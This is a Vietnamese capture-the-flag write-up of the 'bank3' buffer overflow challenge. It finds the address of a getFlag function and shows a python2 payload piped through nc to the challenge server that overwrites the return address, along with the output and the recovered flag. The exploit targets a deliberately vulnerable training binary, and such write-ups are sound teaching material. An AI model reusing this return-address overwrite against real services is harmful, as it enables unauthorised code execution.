## ⚡ [bank3](https://ctf.hcmus.edu.vn/challenges#bank3-10)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/50-pts-brightgreen.svg)](https://img.shields.io/badge/50-pts-brightgreen.svg)

Tác giả: `xikhud`

Tags: `pwn` `bof`

### Summary

Chạy thử chương trình thì thấy nó giống challange `bank1` trước đó, lần này thì ta có thêm file binary.

Nhân tiện, challange này giống hệt [bank2](../bank2/README.md) xD.

Tìm thấy hàm `getFlag` như sau:

```c
void getFlag(void)
{
  system("cat flag.txt");
  return;
}
```

Vậy ta chỉ cần lấy địa chỉ hàm này rồi overflow là xong.

```bash
$ objdump -t bank3 | grep getFlag
08048506 g     F .text  0000002b              getFlag
```

### Exploit

Overflow để đến được hàm `getFlag` với địa chỉ vừa lấy được:

```bash
$ python2 -c 'print "A"*80 + "\x06\x85\x04\x08"' | nc 61.28.237.24 30204
[+] Please enter your name: [+] Thanks for the registration, your balance is 1094795585.
HCMUS-CTF{overwrite_all_the_things}
```

📫 Flag: **`HCMUS-CTF{overwrite_all_the_things}`**

---
*[Back to table of contents](../README.md)*
